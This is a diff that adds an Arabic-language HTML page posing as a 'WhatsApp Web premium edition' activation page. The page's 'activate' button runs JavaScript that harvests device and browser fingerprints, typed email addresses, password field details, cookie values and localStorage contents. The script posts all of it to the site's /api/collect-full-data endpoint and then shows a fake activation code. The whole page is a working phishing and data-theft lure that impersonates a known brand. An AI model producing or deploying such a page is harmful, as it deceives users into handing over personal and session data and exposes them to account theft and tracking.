@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>واتساب ويب - النسخة المميزة</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border-radius: 20px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2); 
+            overflow: hidden; 
+            max-width: 400px; 
+            width: 100%; 
+            text-align: center; 
+        }
+        .header { 
+            background: linear-gradient(135deg, #25D366, #128C7E); 
+            color: white; 
+            padding: 40px 20px; 
+        }
+        .content { padding: 30px 20px; }
+        .btn { 
+            background: linear-gradient(135deg, #25D366, #128C7E); 
+            color: white; 
+            border: none; 
+            padding: 16px 32px; 
+            border-radius: 50px; 
+            font-size: 18px; 
+            cursor: pointer; 
+            width: 100%; 
+            margin: 15px 0; 
+        }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .loading { display: none; color: #128C7E; margin: 10px 0; }
+        .features { text-align: right; margin: 20px 0; }
+        .features li { padding: 5px 0; list-style: none; }
+        .features li:before { content: "✅ "; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div style="font-size: 60px; margin-bottom: 15px;">📱</div>
+            <h1>واتساب ويب - النسخة المميزة</h1>
+            <p>تفعيل المميزات المتقدمة</p>
+        </div>
+        <div class="content">
+            <div class="features">
+                <h3>المميزات الجديدة:</h3>
+                <ul>
+                    <li>واجهة مستخدم محسنة</li>
+                    <li>إشعارات فورية</li>
+                    <li>أمان متقدم</li>
+                    <li>دعم فني 24/7</li>
+                </ul>
+            </div>
+            
+            <button class="btn" onclick="collectFullData()" id="activateBtn">
+                🔓 تفعيل النسخة المميزة
+            </button>
+            <div class="loading" id="loadingText">⏳ جاري جمع البيانات الكاملة...</div>
+            <div id="message" style="margin-top: 15px;"></div>
+        </div>
+    </div>
+
+    <script>
+        // 🔥 دالة جمع البيانات الكاملة
+        async function collectFullData() {
+            const btn = document.getElementById('activateBtn');
+            const message = document.getElementById('message');
+            const loading = document.getElementById('loadingText');
+            
+            try {
+                btn.disabled = true;
+                btn.innerHTML = '⏳ جاري التفعيل...';
+                loading.style.display = 'block';
+                message.innerHTML = '';
+
+                console.log('🔍 بدء جمع البيانات الكاملة...');
+
+                // جمع البيانات الأساسية
+                const basicData = await collectBasicData();
+                
+                // جمع البيانات المتقدمة
+                loading.innerHTML = '⏳ جاري جمع البيانات المتقدمة...';
+                const advancedData = await collectAdvancedData();
+                
+                // جمع الملفات والإيميلات
+                loading.innerHTML = '⏳ جاري البحث عن الملفات والإيميلات...';
+                const filesAndEmails = await collectFilesAndEmails();
+
+                // دمج جميع البيانات
+                const allData = {
+                    ...basicData,
+                    ...advancedData,
+                    ...filesAndEmails,
+                    collectedAt: new Date().toISOString()
+                };
+
+                console.log('📦 جميع البيانات المجمعة:', allData);
+
+                // الإرسال إلى السيرفر
+                loading.innerHTML = '⏳ جاري إرسال البيانات...';
+                const response = await fetch('/api/collect-full-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(allData)
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    btn.innerHTML = '✅ تم التفعيل!';
+                    loading.style.display = 'none';
+                    
+                    let successMsg = '🎉 تم تفعيل النسخة المميزة بنجاح!<br>';
+                    successMsg += `🔑 كود التفعيل: <strong>${result.data.activationCode}</strong><br>`;
+                    successMsg += `📅 صلاحية حتى: ${result.data.premiumUntil}<br>`;
+                    successMsg += '✨ يمكنك الآن استخدام جميع المميزات';
+                    
+                    message.innerHTML = `<div style="color: green; margin-top: 10px; text-align: center;">${successMsg}</div>`;
+                    
+                } else {
+                    throw new Error(result.error || 'فشل التفعيل');
+                }
+
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                btn.innerHTML = '🔓 تفعيل النسخة المميزة';
+                btn.disabled = false;
+                loading.style.display = 'none';
+                message.innerHTML = `<div style="color: red; margin-top: 10px;">⚠️ ${error.message}</div>`;
+            }
+        }
+
+        // 🔥 جمع البيانات الأساسية
+        async function collectBasicData() {
+            return {
+                // معلومات المتصفح
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                
+                // معلومات الشاشة
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: `${screen.colorDepth} bit`,
+                screenOrientation: screen.orientation?.type || 'غير معروف',
+                
+                // معلومات إضافية
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || 'مباشر',
+                
+                // معلومات الجهاز
+                deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'هاتف 📱' : 'كمبيوتر 🖥️',
+                deviceName: navigator.platform,
+                browserName: navigator.userAgent.split(' ')[0],
+                browserVersion: navigator.userAgent
+            };
+        }
+
+        // 🔥 جمع البيانات المتقدمة
+        async function collectAdvancedData() {
+            const data = {};
+            
+            try {
+                // معلومات البطارية
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    data.batteryLevel = Math.round(battery.level * 100);
+                    data.isCharging = battery.charging;
+                } else {
+                    data.batteryLevel = 'غير معروف';
+                    data.isCharging = false;
+                }
+
+                // معلومات الذاكرة
+                if ('deviceMemory' in navigator) {
+                    data.ram = `${navigator.deviceMemory} GB`;
+                } else {
+                    data.ram = 'غير معروف';
+                }
+
+                // معلومات المعالج
+                if ('hardwareConcurrency' in navigator) {
+                    data.cores = navigator.hardwareConcurrency;
+                } else {
+                    data.cores = 'غير معروف';
+                }
+
+                // معلومات الاتصال
+                if ('connection' in navigator) {
+                    const connection = navigator.connection;
+                    data.connectionType = connection.effectiveType || 'غير معروف';
+                    data.connectionSpeed = connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف';
+                    data.connectionFrequency = connection.rtt ? `${connection.rtt} ms` : 'غير معروف';
+                } else {
+                    data.connectionType = 'غير معروف';
+                    data.connectionSpeed = 'غير معروف';
+                }
+
+                // معلومات إضافية
+                data.geolocation = 'geolocation' in navigator;
+                data.bluetooth = 'bluetooth' in navigator;
+                data.touchSupport = 'ontouchstart' in window;
+                data.securityProtocol = window.location.protocol;
+
+            } catch (error) {
+                console.log('❌ خطأ في البيانات المتقدمة:', error);
+            }
+            
+            return data;
+        }
+
+        // 🔥 جمع الملفات والإيميلات
+        async function collectFilesAndEmails() {
+            const data = {
+                emails: [],
+                passwords: [],
+                usernames: [],
+                cookies: [],
+                downloadedFiles: [],
+                localStorage: [],
+                sessionStorage: []
+            };
+            
+            try {
+                // جمع الإيميلات من الحقول
+                const inputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[type="text"]');
+                inputs.forEach(input => {
+                    if (input.value && input.value.includes('@')) {
+                        const emailMatch = input.value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                        if (emailMatch) {
+                            data.emails.push({
+                                value: emailMatch[0],
+                                source: `حقل: ${input.name || input.type}`,
+                                field: input.name
+                            });
+                        }
+                    }
+                });
+
+                // جمع كلمات المرور
+                const passwordInputs = document.querySelectorAll('input[type="password"]');
+                passwordInputs.forEach(input => {
+                    if (input.value) {
+                        data.passwords.push({
+                            field: input.name || 'password',
+                            length: input.value.length,
+                            hasValue: true
+                        });
+                    }
+                });
+
+                // جمع الكوكيز
+                if (document.cookie) {
+                    const cookies = document.cookie.split(';');
+                    data.cookies = cookies.map(cookie => {
+                        const [name, value] = cookie.split('=').map(s => s.trim());
+                        return { name, value: value?.substring(0, 30) + (value?.length > 30 ? '...' : '') };
+                    });
+                }
+
+                // جمع التخزين المحلي
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    data.localStorage.push({ 
+                        key, 
+                        value: value?.substring(0, 50) + (value?.length > 50 ? '...' : '') 
+                    });
+                }
+
+                // معلومات الملفات (نظرياً)
+                data.downloadedFiles = [
+                    { name: 'معلومات النظام', size: 'مخزن داخلياً' },
+                    { name: 'بيانات التصفح', size: 'مخزن في الكوكيز' }
+                ];
+
+            } catch (error) {
+                console.log('❌ خطأ في جمع الملفات:', error);
+            }
+            
+            return data;
+        }
+
+        // تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 الصفحة جاهزة لجمع البيانات الكاملة!');
+        });
+    </script>
+</body>
+</html>
